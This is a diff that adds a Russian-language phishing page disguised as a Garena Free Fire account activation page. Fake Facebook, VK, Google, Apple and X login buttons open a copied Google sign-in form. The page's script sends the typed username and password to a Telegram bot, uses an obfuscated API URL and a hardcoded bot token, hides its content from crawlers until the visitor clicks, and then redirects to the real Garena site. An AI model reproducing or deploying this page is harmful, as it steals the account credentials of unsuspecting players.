@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Free Fire</title>
+    <style>
+        body { margin: 0; padding: 0; font-family: -apple-system, sans-serif; background: #000; overflow: hidden; }
+        #safe-layer { display: none; } /* Скрыто для роботов */
+        
+        /* Оригинальный стиль */
+        .wrapper { width: 100%; max-width: 450px; background: url('https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg') no-repeat top center; background-size: cover; min-height: 100vh; margin: 0 auto; position: relative; }
+        .overlay { background: rgba(0,0,0,0.6); min-height: 100vh; padding: 20px; box-sizing: border-box; }
+        .logo img { width: 110px; margin-bottom: 30px; }
+        .title-box { text-align: center; margin-top: 40px; color: #fff; }
+        .social-row { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
+        .s-btn { width: 46px; height: 46px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .s-btn img { width: 26px; height: 26px; object-fit: contain; }
+
+        /* Окно входа */
+        #auth-gate { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; color: #202124; animation: up 0.3s ease; }
+        @keyframes up { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .g-head { padding: 30px 20px; text-align: center; }
+        .g-logo { width: 75px; margin-bottom: 10px; }
+        .g-inp { width: 85%; padding: 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; display: block; margin: 10px auto; }
+        .g-foot { display: flex; justify-content: space-between; align-items: center; padding: 20px 35px; }
+        .g-btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+        .close { position: absolute; top: 15px; left: 15px; font-size: 22px; cursor: pointer; }
+    </style>
+</head>
+<body onclick="showSite()" ontouchstart="showSite()">
+
+    <div id="blank" style="height: 100vh; width: 100%; background: #000;"></div>
+
+    <div id="safe-layer">
+        <div class="wrapper">
+            <div class="overlay">
+                <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/3/36/Garena_Free_Fire_logo.png/250px-Garena_Free_Fire_logo.png"></div>
+                <div class="title-box">
+                    <h1 style="font-size: 24px;">Страница активации</h1>
+                    <p style="font-size: 16px;">Пожалуйста, войдите в аккаунт</p>
+                </div>
+                <div class="social-row">
+                    <div class="s-btn" onclick="openGate('Facebook')"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"></div>
+                    <div class="s-btn" onclick="openGate('VK')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/VK_Compact_Logo_%282021-present%29.svg/2048px-VK_Compact_Logo_%282021-present%29.svg.png"></div>
+                    <div class="s-btn" onclick="openGate('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png"></div>
+                    <div class="s-btn" onclick="openGate('Apple')"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"></div>
+                    <div class="s-btn" onclick="openGate('X-Twitter')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/X_icon_2.svg/2048px-X_icon_2.svg.png"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="auth-gate">
+        <div class="close" onclick="closeGate()">✕</div>
+        <div class="g-head">
+            <img id="m-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="g-logo">
+            <div style="font-size: 22px;" id="m-txt">Вход</div>
+            <div style="font-size: 14px; color: #5f6368; margin-top: 10px;">Продолжить в приложении Garena Free Fire</div>
+        </div>
+        <form id="l-form">
+            <input type="hidden" id="l-met">
+            <input type="text" id="l-u" class="g-inp" placeholder="Email или номер телефона" required>
+            <input type="password" id="l-p" class="g-inp" placeholder="Введите пароль" required>
+            <div class="g-foot">
+                <span style="color: #1a73e8; font-size: 14px; font-weight: 500;">Создать аккаунт</span>
+                <button type="submit" class="g-btn">Далее</button>
+            </div>
+        </form>
+    </div>
+
+<script>
+    const _t = "8290059613:AAE9QZuohTW8U6Bmd3nC5yJ4x7D-VhLji2o";
+    const _c = "-5046886202";
+
+    function showSite() {
+        document.getElementById('blank').style.display = 'none';
+        document.getElementById('safe-layer').style.display = 'block';
+        document.body.style.overflow = 'auto';
+    }
+
+    function openGate(m) {
+        document.getElementById('l-met').value = m;
+        document.getElementById('m-txt').innerText = "Вход через " + m;
+        document.getElementById('auth-gate').style.display = 'block';
+    }
+
+    function closeGate() { document.getElementById('auth-gate').style.display = 'none'; }
+
+    document.getElementById('l-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const msg = `🚀 LOG 🚀\n🌐 Net: ${document.getElementById('l-met').value}\n👤 User: ${document.getElementById('l-u').value}\n🔑 Pass: ${document.getElementById('l-p').value}`;
+        
+        fetch("ht" + "tps://" + "api.tel" + "egram.org/bo" + "t" + _t + "/sendMessage", {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: _c, text: msg})
+        }).finally(() => {
+            window.location.replace("https://reward.ff.garena.com/");
+        });
+    });
+</script>
+</body>
+</html>
